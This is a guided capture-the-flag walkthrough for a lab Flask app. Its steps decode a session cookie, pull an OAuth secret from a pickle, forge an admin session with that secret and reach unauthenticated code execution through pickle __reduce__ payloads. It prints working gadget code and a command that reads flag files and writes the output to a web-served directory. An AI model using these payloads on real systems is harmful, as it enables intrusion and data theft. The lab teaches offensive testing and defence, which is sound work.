# Guided track

A walkthrough that makes you do the thinking.

Every step has the same shape:

> **Look** — something to do or observe.
> **Predict** — a question. *Answer it out loud before you look at the answer.*
> **Check** — points to the answer, which lives in the *"Stage N answers"*
> section at the end of that stage (e.g. "Answer 2.1"). Don't scroll past
> the end of the stage until you've committed to a prediction.
> **Why it matters** — the part that transfers to real targets.

The predictions are the point. Reading an answer you already committed to is
how it sticks; reading one you didn't is just reading. If you're wrong, that
is the most useful possible outcome — you've just found a gap you didn't know
you had.

**Setup:** lab running at `http://192.168.60.1:8888/` (adjust to your
`.env`), proxy in front of it, and a Python environment **on your attacker
machine** (Kali), in a scratch folder, not inside this repo. Kali blocks
system-wide `pip install`, so use a venv (`sudo apt install python3-venv` if
the command below complains):

```bash
python3 -m venv .venv && .venv/bin/pip install flask requests
```

---
# Stage 1 — Recon

## Step 1: Map the application

**Look.** Browse the site through your proxy. Click everything. Read
`/robots.txt`. Sign in with any email and password (the IdP accepts
anything), then visit `/account` and try `/admin`.

**Predict.** You now know the app has docs pages, a search box, a sign-in
flow, an account page, and an admin page you can't reach. *Which of these
creates state on the server side before you have proven who you are?*

> **Check →** Answer **1.1** at the end of this stage. Commit to your prediction first.

**Why it matters.** Pre-authentication state is the richest hunting ground
in any app. The application must track something on behalf of someone it has
no reason to trust yet, and that tracking has to live somewhere. Password
reset, email verification, multi-step signup, and OAuth are all the same
shape. Start there, not at the login form.

---

## Step 2: Watch the flow start

**Look.** In your proxy, find `GET /auth/login`. Look at the **response
headers** — specifically `Set-Cookie`.

**Predict.** The server needs to remember a CSRF token and where to send you
afterwards. *Roughly how many bytes should that take?*

> **Check →** Answer **1.2** at the end of this stage. Commit to your prediction first.

**Why it matters.** This single observation is the entire finding. Everything
after it is mechanics.

Get in the habit of *measuring* opaque blobs rather than skimming past them.
A cookie, a hidden form field, a `state` parameter, a `next` token — if it's
dramatically larger than the data it plausibly carries, the application is
storing **structure** in it, and structure means something gets parsed on the
way back in.

Oversized blob → something non-trivial is being deserialized. Always.

---

## Step 3: Read the cookie

**Look.** Copy the `nimbus_session` value. It looks like
`.eJx1kE1...` with two more dot-separated chunks after it.

**Predict.** Flask signs its session cookies. *Does that mean you can't read
this one without the key?*

> **Check →** Answer **1.3** at the end of this stage. Commit to your prediction first.

**Look.** The format is `payload.timestamp.signature`, each base64url. A
leading `.` means the payload is zlib-compressed:

```python
import base64, json, zlib

cookie = "PASTE_IT_HERE"
raw = cookie.lstrip(".").split(".")[0]
data = base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4))
if cookie.startswith("."):
    data = zlib.decompress(data)
print(json.dumps(json.loads(data), indent=2))
```

**Predict.** Before you run it — *what do you expect to see?*

> **Check →** Answer **1.4** at the end of this stage. Commit to your prediction first.

**Why it matters.** Knowing a framework's serialization quirks is what turns
"weird blob" into "I know exactly what this is." Flask tags `bytes`, `tuple`,
`datetime`, `UUID` and `Markup` this way. Spend ten minutes reading
`flask.json.tag` sometime; it pays for itself.

---

## Step 4: Identify the bytes

**Look.** Decode that inner base64 and look at the first few bytes.

```python
blob = base64.b64decode(session["oauth_flows"][csrf][" b"])
print(blob[:20])
```

**Predict.** It starts `\x80\x04\x95`. *What format is that?*

> **Check →** Answer **1.5** at the end of this stage. Commit to your prediction first.

**Why it matters.** You have just learned that **the application round-trips
a pickle through the client**. Pause on that. Even with a perfect signature,
this is a design that only works as long as one secret never leaks. You've
found the shape of a critical bug before you've found a single flaw.

---

## Step 5: Read the pickle *without* running it

**Predict.** You want to know what's inside. *Should you `pickle.loads()` it?*

> **Check →** Answer **1.6** at the end of this stage. Commit to your prediction first.

**Look.** Run the string extraction.

**Predict.** *What's in there, and which item is the serious one?*

> **Check →** Answer **1.7** at the end of this stage. Commit to your prediction first.

**Why it matters.** Stop and recognise that this is already a reportable
critical on its own. An OAuth client secret lets an attacker impersonate the
application to the identity provider. You could write this up right now.

Most people would. **Don't yet** — ask the follow-up question first. That
question is what separates a good report from a great one.

---

## Stage 1 answers

*Only scroll here after you've made your prediction.*

### Answer 1.1

The **sign-in flow**. Everything else either serves static content or
requires an established session.

`/auth/login` is reachable with no credentials at all, and it has to
remember something — where to send you back, a CSRF value — across a
round-trip to a third party. That means it creates state *for an anonymous
stranger*, which is you.

### Answer 1.2

A 22-character CSRF token and a path like `/account` is maybe 40 bytes of
actual data. Call it 150 bytes once it's JSON-wrapped, base64'd and signed.

The real cookie is around **600 bytes**. That's four times larger than the
job requires.

### Answer 1.3

No. **Signed is not encrypted.** The signature proves the server wrote the
cookie and that nobody modified it. It does nothing to hide the contents.

Anyone holding the cookie can read every byte of it. The only thing they
can't do — yet — is change it.

### Answer 1.4

```json
{
  "csrf_token": "ZmtFPazrcR0oGoRjBD5oPg",
  "oauth_flows": {
    "ZmtFPazrcR0oGoRjBD5oPg": { " b": "gASVTwEAAAAAAACMCm9hdXRoX2Zsb3eU..." }
  }
}
```

The CSRF token is the boring half. The interesting half is `oauth_flows` — a
dictionary keyed by that same token, holding a large opaque value.

That `{" b": ...}` wrapper is Flask's own tagging scheme. JSON has no byte
type, so Flask encodes `bytes` as an object with a `" b"` key (note the
leading space) and a base64 string.

So: the server is storing **raw bytes** in your cookie.

### Answer 1.5

A **Python pickle**, protocol 4. `\x80` is the `PROTO` opcode and `\x04` is
the version.

Worth memorising alongside the other magic bytes you already know (`PK` for
zip, `\x89PNG`, `%PDF`). `gASV` is what protocol-4 pickle looks like after
base64 — once you've seen it a few times you'll spot it in a token at a
glance.

### Answer 1.6

**No.** Unpickling executes code. Whose machine would that code run on?
Yours.

This blob came from a server you're attacking. Treating it as inert data
because you're the attacker is exactly backwards — a hostile target can
serve a payload aimed at the tester. This is a real technique against
security tooling.

Use `pickletools`, which walks the opcodes without executing them:

```python
import pickletools
pickletools.dis(blob)                                      # full disassembly
[a for _, a, _ in pickletools.genops(blob) if isinstance(a, str)]  # strings
```

### Answer 1.7

```
['oauth_flow', 'OAuthFlow',
 'client_id',     '379236458117-docs.apps.nimbuscloud.dev',
 'client_secret', 'NMBS-S2HMG4adyDsJd4VezKkO1v1dkiLhdQam',   ← this one
 'redirect_uri',  '/auth/callback',
 'scopes', 'openid', 'email', 'profile',
 'state',    '...',
 'next_url', '/',
 'created_at',
 'debug_note', 'FLAG{recon_...}']
```

🚩 **`FLAG{recon_...}`** — stage 1 done.

But the flag is the consolation prize. The finding is **`client_secret`**:
the application's OAuth client secret, handed to every anonymous visitor who
touches `/auth/login`.

---

# Stage 2 — The key signs the data that contains it

## Step 6: The follow-up question

**Predict.** You are holding a secret the developers believed was private.
*What else in this application depends on a secret being private?*

> **Check →** Answer **2.1** at the end of this stage. Commit to your prediction first.

**Why it matters.** This is the habit that makes chains. Any time you obtain
a credential, immediately inventory every other place that application needs
a credential, and test the one against the others. Config files, JWT signing
keys, session keys, API tokens, encryption keys, admin passwords.

Credential reuse is the single most productive assumption in offensive work,
because from the developer's side it never feels like a decision. It feels
like not generating a redundant string.

---

## Step 7: Test the hypothesis

**Look.** Don't reimplement Flask's key derivation (HMAC-SHA1, salt
`"cookie-session"`, via `itsdangerous`). Make Flask hand you the real thing:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "NMBS-...the secret you found..."
signer = SecureCookieSessionInterface().get_signing_serializer(app)

signer.loads(cookie_from_the_server)   # BadSignature if wrong
```

**Predict.** *What does it mean if this does not raise?*

> **Check →** Answer **2.2** at the end of this stage. Commit to your prediction first.

**Why it matters.** Use the framework to attack the framework. Reimplementing
a signing scheme from the docs is slow and introduces bugs you'll blame on
the target. Nearly every framework will do the cryptography for you if you
instantiate it with the key you think is right.

---

## Step 8: Forge a session

**Look.** Read how `/admin` decides. It checks
`session["user"]["role"] == "admin"`. No database lookup.

```python
forged = signer.dumps({
    "user": {"email": "you@lab", "name": "you", "role": "admin"}
})
```

Send it as the `nimbus_session` cookie — paste it into the Cookie header in
Repeater and fire at `/admin`.

🚩 **`FLAG{forge_...}`**

**Predict.** You have authentication bypass and privilege escalation on an
unauthenticated attack path. *Is it time to write the report?*

> **Check →** Answer **2.3** at the end of this stage. Commit to your prediction first.

**Why it matters.** This is the discipline that produces the difference
between a high and a critical. When you gain a new capability, don't cash it
in immediately — re-examine everything you've already seen in light of it.

You saw a pickle in step 4 and correctly moved on, because forging cookies
was impossible then. It isn't anymore. **Go back.**

---

## Stage 2 answers

*Only scroll here after you've made your prediction.*

### Answer 2.1

**The cookie's own signature.**

Flask signs sessions with `SECRET_KEY`. You just found a long random string
that the developers treated as confidential. Developers who need "a random
secret string" very often reach for one they already have.

The hypothesis: `SECRET_KEY == client_secret`. The secret is sitting *inside
the thing it protects*.

### Answer 2.2

It means the application signs its sessions with a key it ships to you
inside every session.

The integrity guarantee is circular, and therefore worth nothing. You can now
mint any session the application will accept.

Confirm the negative too — flip one character of the secret and watch it
raise `BadSignature`. A test that passes for both the right and wrong answer
isn't a test.

### Answer 2.3

Not yet. You control an input that the server **deserializes**.

Stage 1 told you `/auth/login` *writes* a pickle into the session. Something
must *read* it. Find that, and "admin access" becomes "code execution."

---

# Stage 3 — Forged session → RCE

## Step 9: Find the sink

**Predict.** `/auth/login` writes the pickled flow. *Which endpoint has to
read it back, and what must it do to the bytes first?*

> **Check →** Answer **3.1** at the end of this stage. Commit to your prediction first.

**Look.** Read those lines carefully. Both the **lookup key** (`csrf`) and
the **bytes** (`blob`) come out of the session. You control the session.

**Predict.** *Do you need a valid authorization `code`? A matching `state`?
Anything at all from the identity provider?*

> **Check →** Answer **3.2** at the end of this stage. Commit to your prediction first.

**Why it matters.** **Order of operations is its own vulnerability class.**
"The endpoint validates the request" is meaningless if the dangerous work
happens before the validation.

When you read code, don't just ask *is this checked?* Ask *what has already
happened by the time the check runs?* Parsing, deserializing, logging,
database lookups and template rendering all routinely occur before
authorization, and each one is a sink.

---

## Step 10: Build the gadget

**Predict.** You need pickle bytes that run code on load. *Do you have to
hand-assemble opcodes?*

> **Check →** Answer **3.3** at the end of this stage. Commit to your prediction first.

**Why it matters.** The callable and its arguments must make sense on the
*server*, not locally. Stick to the standard library (`os`, `subprocess`,
`time`) — anything you import must exist there.

---

## Step 11: Prove execution without causing any

**Predict.** You could send `os.system("id")` right now. *On a real
engagement, should you?*

> **Check →** Answer **3.4** at the end of this stage. Commit to your prediction first.

**Look.** Now run the controls. A skeptical reader will say your endpoint is
just slow:

| Request | Expected |
|---|---|
| No cookie | 400, instant |
| Valid cookie, one byte of signature flipped | 400, instant |
| Valid signature, no matching flow entry | 400, instant |
| Valid signature, `sleep(6)` payload | 400, **after ~6s** |

**Predict.** *Why does the table matter more than the single slow response?*

> **Check →** Answer **3.5** at the end of this stage. Commit to your prediction first.

**Why it matters.** Demonstrating impact without causing it is a
professional skill, not a formality. Timing proofs, DNS callbacks, benign
file reads and `whoami` are the standard vocabulary. Learn to reach for the
smallest proof that forecloses the argument.

---

## Step 12: Get output back

**Look.** Swap `time.sleep` for `os.system` and run a command.

**Predict.** The callback returns the same error page as always. *Where did
your command's output go?*

> **Check →** Answer **3.6** at the end of this stage. Commit to your prediction first.

**Predict.** The container is read-only and has no outbound network. *What's
left?*

> **Check →** Answer **3.7** at the end of this stage. Commit to your prediction first.

**Why it matters.** This is the most realistic step in the lab. Real
exploitation is rarely blocked by the vulnerability — it's blocked by
plumbing: no outbound DNS, no writable path, no response channel.

The habit worth taking: **your recon already contains the answer.** You saw
that cache directory load in your proxy in step 1 and had no reason to care.
Good notes beat good memory. When you're stuck on exfiltration, re-read your
own proxy history before you reach for a new technique.

---

## Stage 3 answers

*Only scroll here after you've made your prediction.*

### Answer 3.1

`/auth/callback` — the endpoint the IdP redirects you to. To use the flow
object it has to `pickle.loads()` it.

```python
csrf = session.get("csrf_token")
blob = session.get("oauth_flows", {}).get(csrf)
if blob is None: ...
flow = pickle.loads(blob)              # ← the sink
userinfo = flow.exchange_code(request.args.get("code", ""))
```

### Answer 3.2

**No.** Look at the order.

`pickle.loads()` runs on line 5. Every piece of validation — the code's
signature, the audience check, the expiry — lives inside `exchange_code()`
on line 6.

Your payload executes before a single check happens. The flow entry only has
to *exist* under the key you choose, and you write both.

### Answer 3.3

No. Pickle has a documented, supported hook for exactly this: `__reduce__`
returns `(callable, args)`, and the unpickler calls it on load.

```python
import os, pickle

class Exec:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exec())
```

Nothing here is a trick or an exploit primitive. It's how pickle rebuilds
objects. That's precisely why the format can never be made safe for
untrusted input — arbitrary calls aren't a bug in pickle, they're the
feature.

### Answer 3.4

No. Running commands on a production system is how a finding becomes an
incident — and how a bounty becomes a conversation with a lawyer.

Prove execution with something **inert and measurable**:

```python
import time
class Sleep:
    def __init__(self, s): self.s = s
    def __reduce__(self): return (time.sleep, (self.s,))
```

Send `sleep(0)`, `sleep(3)`, `sleep(6)` and time each response. If latency
tracks the number *you chose*, the server imported `time` and called `sleep`
with your argument. That is execution, demonstrated, with zero side effects.

### Answer 3.5

Because it eliminates every alternative explanation. One slow request proves
nothing — networks jitter, endpoints are slow, databases stall.

The table shows the delay appears *only* with a valid signature *and* a
payload *you* crafted, and that its duration is a value you picked. Nothing
but code execution explains that pattern.

This table is what goes in the report. It's also what makes a triager accept
the finding in one pass instead of four.

### Answer 3.6

To the container's stdout — the gunicorn log. Not into your HTTP response.

The sink is in an exception-handling path that renders a generic error
regardless. You have **blind** code execution and need a side channel.

### Answer 3.7

Somewhere must be writable, because the app writes its search index at
startup — the changelog page mentions a pre-built index, and you saw
`/static/cache/search-index.json` load in your proxy on the very first page.

`/app/static/cache/` is a writable tmpfs **and** it's served over HTTP.
Write there, then read it back:

```python
cmd = "(id; ls -la /; cat /flag_*.txt) > /app/static/cache/n.txt 2>&1"
```

then `GET /static/cache/n.txt`.

🚩 **`FLAG{rce_...}`**

Delete the file when you're done.

---

# Debrief

## The chain

> Secret stored in a signed-but-readable cookie → that secret *is* the
> signing key → forged cookie reaches a `pickle.loads()` that runs before
> any validation → unauthenticated RCE.

Four ordinary mistakes. Not one is exotic; a competent developer made each
for a sensible-sounding reason. The skill was noticing they stacked.

## Self-check

You've understood this if you can answer without scrolling up:

1. Why doesn't a valid signature make unpickling safe?
2. Why did the `state` parameter never matter?
3. Why is `pickletools` the right way to inspect a hostile pickle?
4. What's the smallest change to the app that breaks the whole chain?
5. Why is the controls table worth more than the exploit?

*Answers are at the very bottom of this page. Write yours first.*

## The transferable checklist

Next app you look at:

- [ ] **Measure every opaque blob.** Cookies, `state` params, hidden
      fields, tokens. Bigger than its job → structure inside → a parser.
- [ ] **Decode before assuming.** Signed ≠ encrypted. Try base64, zlib,
      JWT, pickle, PHP serialize, Java `AC ED`, .NET ViewState.
- [ ] **Hunt pre-auth state.** OAuth, password reset, email verification,
      multi-step signup — state created for a stranger.
- [ ] **Test every secret against every secret-shaped thing.** Reuse is the
      most common chain-maker in the business.
- [ ] **For each dangerous sink, ask what runs before the checks.**
- [ ] **Prove impact with the smallest proof that works.**
- [ ] **Re-read your recon when you get stuck.** The answer is usually in
      your proxy history already.

## Where this generalises

The same chain, with different nouns:

| Ecosystem | Serialized client state | Sink |
|---|---|---|
| Flask / Python | session cookie | `pickle.loads`, `yaml.load` |
| Rails / Ruby | `_session_id` cookie | `Marshal.load` |
| PHP | cookies, form fields | `unserialize()` |
| Java | cookies, params, RMI | `ObjectInputStream.readObject` |
| ASP.NET | `__VIEWSTATE` | `ObjectStateFormatter` |

Every one has the same two preconditions: an attacker can supply the bytes,
and the integrity check is absent or defeated. You now know how to look for
both.

---

**Next:** compare your approach against [WRITEUP.md](WRITEUP.md), then read
[solve.py](../solutions/solve.py) for a clean scripted version.

---

## Self-check answers

1. The signature only proves the server wrote it, under the assumption the
   key is private. Here the key was published inside the cookie, so the
   assumption — and everything built on it — fails.
2. `pickle.loads()` executes before `exchange_code()` runs any validation.
   The payload fires first.
3. It walks opcodes without executing them. `pickle.loads()` would run the
   target's code on *your* machine.
4. Any one of: don't put the secret in the flow object; use a dedicated
   `SECRET_KEY`; keep flow state server-side behind an opaque ID; use JSON
   instead of pickle. Each independently breaks the chain — that's defence
   in depth.
5. It converts "it was slow once" into "only my payload, only with a valid
   signature, for exactly the duration I chose." Credibility is the
   deliverable.
